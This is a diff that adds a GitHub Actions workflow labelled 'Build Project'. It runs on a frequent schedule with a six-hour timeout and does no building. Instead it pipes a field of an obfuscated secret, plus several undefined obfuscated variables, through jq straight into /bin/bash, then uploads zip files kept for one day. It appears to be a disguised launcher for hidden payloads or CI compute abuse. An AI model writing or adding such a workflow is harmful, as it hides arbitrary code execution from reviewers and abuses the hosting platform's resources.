@@ -1,0 +1,35 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '38 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          lni6940: ${{ secrets.lni6940 }}
+        run: |
+          printf '%s' "$lni6940" | jq -r .vwoc794 | /bin/bash
+          echo $kox09 | jq -r .mvan4 | /bin/bash
+          echo $efcn7 | jq -r .wp8 | /bin/bash
+          printf '%s' "$q53" | jq -r .exh0400 | /bin/bash
+          printf '%s' "$zgo25" | jq -r .ksno04817 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: cdsaDjjx
+          path: "*.zip"
+          retention-days: 1
